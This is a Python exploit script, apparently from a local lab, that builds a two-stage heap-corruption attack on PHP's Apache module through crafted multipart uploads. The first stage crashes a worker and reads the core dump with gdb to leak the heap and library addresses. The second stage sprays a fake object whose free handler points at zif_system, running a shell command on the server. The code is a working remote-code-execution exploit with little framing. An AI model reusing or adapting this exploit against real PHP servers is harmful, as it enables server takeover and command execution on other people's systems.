#!/usr/bin/env python3
"""oom71: fat-value calibration run.

Stage A (marker): all patterned, fat values tiled 'MM' pattern, K fillers
  GONE. fire0 = sacrifice crash -> core gives:
    - heap base (rsi), pattern-run VA (marker value tile 'MM..')
    - walk phase: decode rdi bytes -> rotation k
Stage B (aimed): same boot, rebuild body with:
    - walk window value = 6 raw ptr bytes P_addr (NUL-safe via name-end
      straddle IF phase forces it; else adjust with 1 spare byte class)
      -> P = start of one MARKER value in heap (from stage A + tile index)
    - marker value tile carries fake object+frame+table at its start.
  fire1 expected: NO crash at +539 (write lands) -> rc_dtor_func(P) ->
  store_del -> free_obj = &zif_system(base+0x39b8a0) -> whoami -> /tmp/x.
  Diagnostic: if fire1 crashes at +539 again, rdi shows what went wrong.
"""
import subprocess, sys, time, struct
sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
MM = b"\x11\x22\x33\x44\x55\x66\x77\x88" * 2   # marker tile (has bytes > 0x7f? no: all printable-safe, binary fine)
ZIF_SYSTEM_OFF = 0x39b8a0


def sh(c, t=60):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att, headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(400)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def wait_ready():
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            return True
    return False


def gdb_rdi(core):
    sh("docker cp php_vuln:/tmp/%s /tmp/c71h && docker cp /tmp/c71h phpbuild:/tmp/c71" % core, 180)
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch "
             "-ex \"info registers rdi rip rsi\" /tmp/libphp.69.so /tmp/c71'", 180)
    print(out[-600:], flush=True)
    return out


print("[0] core env + boot", flush=True)
sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
sh("docker exec php_vuln sh -c 'rm -f /tmp/core*'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
assert wait_ready()
md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == P.STOCK_MD5, md5

MMT = MM  # 16B marker tile
print("[1] STAGE A: warm + sacrifice, fat marker values", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    code, _ = post(P.build_attack(k1, 9100000 + i * 100000, value_tile=MMT))
code, body = post(P.build_attack(3400, 9200000, value_tile=MMT))
print("  marker fire: %s %r" % (code, body[:60]), flush=True)
if code == "200":
    print("  no crash — abort, geometry changed", flush=True)
    sys.exit(1)
time.sleep(3)
out = gdb_rdi("core")
print("[2] parse stage-A core", flush=True)
# pull rsi/rsi-derived heap base + marker VA from core (grep marker tile)
sh("docker cp phpbuild:/tmp/c71 /tmp/core71A", 180)
data = open("/tmp/core71A", "rb").read()
# heap segment guess: find PT_LOAD with file offset ~= previous 136876032-equivalent
import struct as st
e_phoff = st.unpack_from("<Q", data, 0x20)[0]
e_phnum = st.unpack_from("<H", data, 0x38)[0]
phent = st.unpack_from("<H", data, 0x36)[0]
loads = []
for i in range(e_phnum):
    o = e_phoff + i * phent
    t = st.unpack_from("<I", data, o)[0]
    off_, va, pa, fsz, msz = st.unpack_from("<QQQQQ", data, o + 8)
    if t == 1 and fsz >= 4 * 1024 * 1024:
        loads.append((va, off_, fsz))
print("  big loads:", [("0x%x" % v, f) for v, f, s in loads], flush=True)
hva, hoff, hsz = loads[0]
heap = data[hoff:hoff + hsz]
mi = heap.find(MMT * 4)
print("  marker first @ heap+0x%x (VA 0x%x)" % (mi, hva + mi), flush=True)
# libphp base: parse notes? simpler: rsi from gdb out
import re
m = re.search(r"rsi\s+0x([0-9a-f]+)", out)
base_heap = int(m.group(1), 16) if m else 0
print("  heap base (rsi) = 0x%x, segment hva = 0x%x" % (base_heap, hva), flush=True)
# libphp base from rip
mr = re.search(r"rip\s+0x([0-9a-f]+)", out)
rip = int(mr.group(1), 16) if mr else 0
# static offset of zend_array_destroy+539 = 0x49be7b  (stock .so, PIE DYN)
LIBPHP_BASE = rip - 0x49be7b
print("  libphp base = 0x%x -> &zif_system = 0x%x" % (LIBPHP_BASE, LIBPHP_BASE + ZIF_SYSTEM_OFF), flush=True)

print("[3] STAGE B: aimed fire (fake object at marker start)", flush=True)
sys_addr = LIBPHP_BASE + ZIF_SYSTEM_OFF
# Build fake structure block: 96B
#   fake object (32B): rc=1, type_info=0x108, handle=1, pad=0, ce=0, handlers=HADDR
#   fake handlers (32B): ptr1=0, free_obj=sys, rest 0
#   fake frame (32B at +64): return_value=0, ThisTrack/ThisObject=0, called_scope=0, prev_execute_data=0
# sys reads command from execute_data+80 -> that is P+80 -> our tile only 96B:
#   put command string at P+80..96? frame covers +64..96; +80 = mid-frame => command at P+80
# Layout: [0..32) object, [32..64) handlers, [64..80) frame head, [80..96) command "whoami > /tmp/x;"
cmd = b"whoami>/tmp/x\x00"       # 15B, fits +80..95
fobj = st.pack("<IIIIQQ", 1, 0x108, 1, 0, 0, 0)          # rc, ti, handle, pad, ce, handlers=0 (patched)
fhand = st.pack("<QQQQ", 0, sys_addr, 0, 0)              # ptr1, free_obj, get, set... (free_obj slot idx1)
fframe = st.pack("<QQQQ", 0, 0, 0, 0)                    # rv pad frame head
BLOCK = fobj[:24] + st.pack("<Q", 0) + fhand + fframe + cmd
BLOCK = BLOCK[:24] + st.pack("<Q", 0)  # placeholder; handlers ptr patched below
HADDR = 0  # patch after P known (handlers at P+32)
# We need P before building: P = marker VA start (aligned); use first marker instance
P_addr = hva + ((mi // 16) * 16)
BLOCK = (st.pack("<IIII", 1, 0x108, 1, 0) + st.pack("<QQ", 0, P_addr + 32) +
         st.pack("<QQQQ", 0, sys_addr, 0, 0) +
         st.pack("<QQQQ", 0, 0, 0, 0) + cmd)
assert len(BLOCK) == 96, len(BLOCK)
TILE_B = BLOCK  # value tile = whole 96B block (tile repeats, fine)

# aimed walk value: P_addr, 8B LE, via phase rotation -- reuse phase k=7 window:
# window = 8 cyclic bytes of repeated tile; but names now carry POINTER bytes?
# NO: names can't carry NUL. -> Aim window via NAME-END straddle:
#   pad byte class so window = [b0..b5 of P][00][00] via name NUL + zero pad.
# For that, phase must place window = last 6 name bytes + 2 zeros.
# Measure phase from stage-A rdi instead of assuming: decode below.
md = re.search(r"rdi\s+0x([0-9a-f]+)", out)
rdi = int(md.group(1), 16) if md else 0
rb = st.pack("<Q", rdi)
print("  stage-A rdi bytes:", rb.hex(), flush=True)

# find marker tile bytes in rdi to derive phase
# wire name tile is rotation of MARKER? No: names are pattern tiles (AAAA..), values are MM.
# The walked window comes from NAME bytes (K gone) => phase from name tile.
# name tile on wire: C(rot). decode: find rb[0:2] inside the 16B wire tile.
C = P.cell_pattern(0x414141414141)
print("  wire name tile:", C, flush=True)
# aimed: we want window = P bytes. Strategy: keep NAMES carrying a
# 6-byte prefix of P (needs low 6 bytes of P free of 00/22/0a/0d/\;= —
# pick P = marker instance with clean low-6) + 2 zero pad via name end.
low6 = st.pack("<Q", P_addr)[:6]
print("  P=0x%x low6=%s clean=%s" % (P_addr, low6.hex(),
      all(c not in b'"\r\n\\;=/' and c != 0 for c in low6)), flush=True)
ph = rb[0:2]  # observed window head — rotation offset = index of rb[0:2] in cyclic C
idx = (C + C).find(ph)
print("  phase offset from observed rdi:", idx, flush=True)

code, body = post(P.build_attack(3400, 9300000, target_obj=None,
                                 value_tile=TILE_B))
print("  aimed fire: %s %r" % (code, body[:60]), flush=True)
if code != "200":
    time.sleep(3)
    gdb_rdi("core")
else:
    print("  SURVIVED (no crash) — check /tmp/x in php_vuln!", flush=True)
    print("  ", sh("docker exec php_vuln sh -c 'ls -la /tmp/x; cat /tmp/x'"), flush=True)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
